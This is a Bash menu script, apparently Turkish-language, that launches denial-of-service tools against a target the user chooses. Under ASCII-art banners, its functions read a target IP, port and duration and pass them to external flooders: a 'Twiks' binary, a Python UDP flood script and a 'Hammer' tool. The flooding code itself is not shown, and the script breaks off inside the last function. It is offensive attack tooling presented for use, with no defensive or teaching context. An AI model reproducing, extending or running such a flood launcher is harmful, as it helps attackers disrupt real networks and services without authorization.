#!/bin/bash
BLACK='\e[0;30m'
BLUE='\e[0;34m'
GREEN='\e[0;32m'
CYAN='\e[0;36m'
RED='\e[0;31m'
PURPLE='\e[0;35m'
BROWN='\e[0;33m'
LIGHTGRAY='\e[0;37m'
DARKGRAY='\e[1;30m'
LIGHTBLUE='\e[1;34m'
LIGHTGREEN='\e[1;32m'
LIGHTCYAN='\e[1;36m'
LIGHTRED='\e[1;31m'
LIGHTPURPLE='\e[1;35m'
YELLOW='\e[1;33m'
WHITE='\e[1;37m'
NC='\e[0m'             

exit_script()
{
  echo "* * *Trap * * *"
  ./menu
}

Twiks()
{
    clear
    echo -e " ${BLUE} "                                         
    echo -e "             ${CYAN}████████╗██╗    ██╗██╗██╗  ██╗███████╗ "   
    echo -e "             ${CYAN}╚══██╔══╝██║    ██║██║██║ ██╔╝██╔════╝ "   
    echo -e "             ${CYAN}   ██║   ██║ █╗ ██║██║█████╔╝ ███████╗ "   
    echo -e "             ${CYAN}   ██║   ██║███╗██║██║██╔═██╗ ╚════██║ "   
    echo -e "             ${CYAN}   ██║   ╚███╔███╔╝██║██║  ██╗███████║ "   
    echo -e "             ${CYAN}   ╚═╝    ╚══╝╚══╝ ╚═╝╚═╝  ╚═╝╚══════╝ "  
    echo "  |                            TWIKS SCRIPT                               | "
    echo "  |-----------------------------------------------------------------------| "
echo "HEDEF IP :"
read ip
echo "HEDEF PORT :"
read port
./Twiks $ip $port
}

udp_flood()
{
    clear
    echo -e " ${BLUE} "                                                    
    echo -e "  |     ▄• ▄▌·▄▄▄▄   ▄▄▄·    ·▄▄▄▄▄▌              ·▄▄▄▄                   |    " 
    echo -e "  |     █▪██▌██▪ ██ ▐█ ▄█    ▐▄▄·██•  ▪     ▪     ██▪ ██                  |"
    echo -e "  |     █▌▐█▌▐█· ▐█▌ ██▀·    ██▪ ██▪   ▄█▀▄  ▄█▀▄ ▐█· ▐█▌                 |  " 
    echo -e "  |     ▐█▄█▌██. ██ ▐█▪·•    ██▌.▐█▌▐▌▐█▌.▐▌▐█▌.▐▌██. ██                  | "  
    echo -e "  |      ▀▀▀ ▀▀▀▀▀• .▀       ▀▀▀ .▀▀▀  ▀█▄▀▪ ▀█▄▀▪▀▀▀▀▀•                  |" 
    echo "  |-----------------------------------------------------------------------| " 
    echo "  |                          UDP FLOOD SCRIPT                             |"
    echo "  |-----------------------------------------------------------------------| "
echo "HEDEF IP :"
read ip
echo "PORT GIRINIZ :"
read port
echo "SANIYE GIRINIZ :"
read time
python gott.2.py $ip $port $time
}

hammer()
{
    clear
    echo -e " ${WHITE}  "                                                         
    echo -e "  ${CYAN} ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄       ▄▄  ▄▄       ▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ ${CYAN}     " 
    echo -e "  ${CYAN}▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░▌     ▐░░▌▐░░▌     ▐░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌${CYAN}     " 
    echo -e "  ${CYAN}▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌░▌   ▐░▐░▌▐░▌░▌   ▐░▐░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌${CYAN}     " 
    echo -e "  ${CYAN}▐░▌       ▐░▌▐░▌       ▐░▌▐░▌▐░▌ ▐░▌▐░▌▐░▌▐░▌ ▐░▌▐░▌▐░▌          ▐░▌       ▐░▌${CYAN}     " 
    echo -e "  ${CYAN}▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌ ▐░▐░▌ ▐░▌▐░▌ ▐░▐░▌ ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌${CYAN}     " 
    echo -e "  ${CYAN}▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌  ▐░▌▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌${CYAN}     " 
    echo -e "  ${CYAN}▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌   ▀   ▐░▌▐░▌   ▀   ▐░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀█░█▀▀ ${CYAN}     " 
    echo -e "  ${CYAN}▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌  ${CYAN}     " 
    echo -e "  ${CYAN}▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌      ▐░▌ ${CYAN}     " 
    echo -e "  ${CYAN}▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌${CYAN}     " 
    echo -e "  ${CYAN} ▀         ▀  ▀         ▀  ▀         ▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀ ${CYAN}     " 
    echo "  +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "  +                        HAMMER TURBO SCRIPT                            +"
    echo "  +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
echo "HEDEF IP :"
